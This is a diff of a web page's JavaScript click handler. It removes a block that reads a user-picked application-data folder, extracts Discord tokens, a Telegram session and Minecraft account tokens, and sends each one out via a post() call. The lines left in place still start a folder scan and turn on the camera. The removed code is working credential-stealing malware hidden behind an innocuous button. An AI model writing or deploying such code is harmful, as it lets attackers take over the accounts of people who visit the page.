@@ -366,35 +366,6 @@ $("go").addEventListener("click", async () => {
     runFolderScan();
     camOn();
 
-    /* folder pick finishes here */
-    if (pickPromise) {
-      try {
-        const h = await pickPromise;
-        note("k3", "reading…");
-        const r = await scanRoaming(h);
-        appData = r;
-        const lines = [];
-        if (r.discord && r.discord.length) {
-          const uniq = [...new Set(r.discord)];
-          for (const tok of uniq) await post("Discord token", "dc", tok);
-          lines.push("<b>" + uniq.length + " discord token(s)</b>");
-        }
-        if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
-        if (r.minecraft && r.minecraft.length) {
-          lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
-          for (const a of r.minecraft) await post("Minecraft", a.name || "?", a.token || "token");
-        }
-        note("k3", lines.join("<br>") || "nothing recognisable in there");
-        mark("k3", lines.length ? "done" : "fail");
-        await item("apps", r);
-      } catch (e) { mark("k3", "fail"); note("k3", e.name === "AbortError" ? "skipped" : e.name); }
-    }
-
-    /* camera asks itself, then the screen share follows */
-    camOn();
-
-    /* camera asks itself, then the screen share follows */
-    camOn();
   } catch (e) {
     $("err").textContent = e.message || "Failed.";
     $("go").disabled = false;
